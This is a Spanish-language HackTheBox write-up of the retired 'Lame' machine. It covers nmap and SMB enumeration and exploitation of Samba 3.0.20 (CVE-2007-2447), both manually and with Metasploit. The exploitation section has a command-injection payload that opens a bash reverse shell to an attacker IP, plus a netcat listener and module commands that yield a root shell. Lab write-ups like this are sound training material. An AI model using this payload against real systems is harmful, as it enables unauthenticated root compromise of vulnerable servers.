---
title: 'Lame - HackTheBox'
description: 'Writeup de la máquina Lame de HackTheBox, una máquina Linux muy fácil y una de las primeras de la plataforma. Explotación de una vulnerabilidad en Samba 3.0.20 (CVE-2007-2447) para obtener acceso directo como root.'
pubDate: 2026-04-11
platform: 'htb'
category: 'machines'
difficulty: 'easy'
os: 'linux'
language: es
tags: ['samba', 'smb', 'CVE-2007-2447', 'metasploit', 'rce', 'usermap-script']
retired: true
heroImage: '/images/writeups/hackthebox/lame/card.png'
attackVectors: ['network']
techniques: ['T1210', 'T1059']
vulnerabilities: ['CVE-2007-2447']
certifications: ['OSCP', 'eJPT', 'CEH']
skillLevel: 'beginner'
estimatedTime: '30 minutos'
points: 20
rating: 4.3
---

# Lame - HackTheBox Writeup

**Dificultad**: Easy
**OS**: Linux
**Plataforma**: HackTheBox
**IP**: 10.10.10.3
**Estado**: Retirada ✓

## Introducción

Lame es una de las máquinas más antiguas de HackTheBox y un clásico absoluto para principiantes. Presenta una instalación de Samba 3.0.20 vulnerable al exploit **usermap script** (CVE-2007-2447), que permite ejecución remota de comandos sin autenticación previa. El resultado es acceso directo como `root`.

## Reconocimiento

### Escaneo de puertos

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.3 -oG allPorts
```

**Puertos abiertos:**

- 21/tcp - FTP
- 22/tcp - SSH
- 139/tcp - NetBIOS
- 445/tcp - SMB
- 3632/tcp - distccd

### Escaneo de servicios

```bash
nmap -p21,22,139,445,3632 -sCV 10.10.10.3 -oN targeted
```

**Resultados relevantes:**

```
21/tcp  open  ftp     vsftpd 2.3.4
22/tcp  open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian
```

> **Nota:** La versión vsFTPd 2.3.4 también tiene una backdoor conocida (CVE-2011-2523), pero en esta máquina no funciona.

## Enumeración SMB

```bash
smbclient -L //10.10.10.3 -N
```

**Shares disponibles:**

```
Sharename       Type      Comment
---------       ----      -------
print$          Disk      Printer Drivers
tmp             Disk      oh noes!
opt             Disk
IPC$            IPC       IPC Service (lame server)
ADMIN$          IPC       IPC Service (lame server)
```

El share `tmp` es accesible de forma anónima.

```bash
smbclient //10.10.10.3/tmp -N
```

Acceso conseguido, pero no hay nada relevante dentro.

### Verificación de versión Samba

```bash
nmap -p 445 --script smb-vuln-cve2009-3103,smb2-security-mode 10.10.10.3
```

La versión **Samba 3.0.20** es vulnerable a **CVE-2007-2447** (Username map script).

## Explotación

### CVE-2007-2447 - Samba usermap script

La vulnerabilidad reside en la opción `username map script` de la configuración de smbd. Cuando se pasan caracteres backtick (`` ` ``) o metacaracteres shell en el campo de usuario al negociar una sesión, el servidor los ejecuta como comandos del sistema operativo.

### Método 1: Manual (sin Metasploit)

```bash
smbclient //10.10.10.3/tmp -N --option='client min protocol=NT1'
```

Una vez dentro, aprovechamos la vulnerabilidad enviando un comando en el campo de usuario:

```bash
logon "./=`nohup bash -i >& /dev/tcp/10.10.14.10/4444 0>&1`"
```

Previamente ponemos el listener:

```bash
nc -lvnp 4444
```

**Shell como root obtenida.**

### Método 2: Metasploit

```bash
msfconsole -q
use exploit/multi/samba/usermap_script
set RHOSTS 10.10.10.3
set LHOST tun0
run
```

```
[*] Started reverse TCP double handler on 10.10.14.10:4444
[*] Accepted the first client connection...
[*] Command shell session 1 opened
id
uid=0(root) gid=0(root)
```

## Post-Explotación

### Flags

```bash
# User flag
find / -name "user.txt" 2>/dev/null
cat /home/makis/user.txt

# Root flag
cat /root/root.txt
```

No es necesaria escalada de privilegios: obtenemos `root` directamente.

## Conclusión

Lame es un excelente punto de partida para aprender las bases del pentesting en Linux. Las lecciones clave son:

- La importancia de mantener el software actualizado (Samba 3.0.20 es de 2007)
- Cómo identificar servicios vulnerables con Nmap
- Ejecución de exploits conocidos de forma manual y con Metasploit

| Técnica            | Herramienta         |
| ------------------ | ------------------- |
| Escaneo de puertos | nmap                |
| Enumeración SMB    | smbclient           |
| Explotación RCE    | manual / msfconsole |

## Recursos

- [CVE-2007-2447 - NVD](https://nvd.nist.gov/vuln/detail/CVE-2007-2447)
- [Samba usermap_script - Exploit-DB](https://www.exploit-db.com/exploits/16320)
